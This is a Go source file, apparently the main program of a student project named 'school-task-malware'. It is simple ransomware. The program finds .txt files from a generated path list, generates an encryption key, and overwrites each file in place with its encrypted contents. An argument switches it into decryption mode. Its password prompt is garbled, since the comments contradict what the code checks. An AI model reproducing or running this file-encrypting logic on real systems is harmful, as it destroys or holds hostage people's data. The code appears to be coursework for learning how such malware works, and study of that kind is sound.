package main

import (
	"bufio"
	"fmt"
	"os"
	"school-task-malware/decryption"
	"school-task-malware/encryption"
	"school-task-malware/gettarget"
	"school-task-malware/utility"
	"strings"
)

func main() {

	// if have argument, run the program in decryption mode
	if len(os.Args) > 1 {
		if os.Args[1] == "decryption" {
			decryption.Start()
			os.Exit(0)
		}
	}

	// asking for password
	fmt.Println("Enter password: ")

	// Create a scanner to read user input
	scanner := bufio.NewScanner(os.Stdin)

	// Loop until the user enters something
	for scanner.Scan() {
		// Read the input
		password := scanner.Text()

		// Check if the input is not empty
		if password != "10101" {
			fmt.Println("You entered:", password)
			if password == "exit" {
				break // Exit the loop if input is provided
			}
		}

		// If input is empty, prompt again
		fmt.Println("Password cannot be empty. Please enter a password:")
	}

	// Check if there was an error scanning input
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "error reading input:", err)
	}

	// Specify the list of file extensions to search for
	fileExtensions := []string{".txt"}
	gettarget.Findpath(fileExtensions)

	filePath := "./data/file_paths.txt"
	lines, err :=
		utility.ReadLinesFromFile(filePath)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	key, err := encryption.GenerateEncryptionKey()
	if err != nil {
		panic(err)
	}
	// Print the generated encryption key
	fmt.Println("Generated Encryption Key:", key)

	// Print each line
	for _, line := range lines {
		//if file name file_paths.txt is found, skip it
		if strings.Contains(line, "file_paths.txt") {
			fmt.Println("Skipping file:", line)
			continue
		}
		// get file data
		data, err := utility.ReadFile(line)
		if err != nil {
			fmt.Println("Error reading file:", err)
			return
		}
		encrypted, err := encryption.Encrypt(data, key)
		if err != nil {
			fmt.Println("Error encrypting data:", err)
			return
		}
		// rewrite the file with encrypted data
		err = os.WriteFile(line, encrypted, 0644)
		if err != nil {
			fmt.Println("Error writing to file:", err)
			return
		}
	}
}
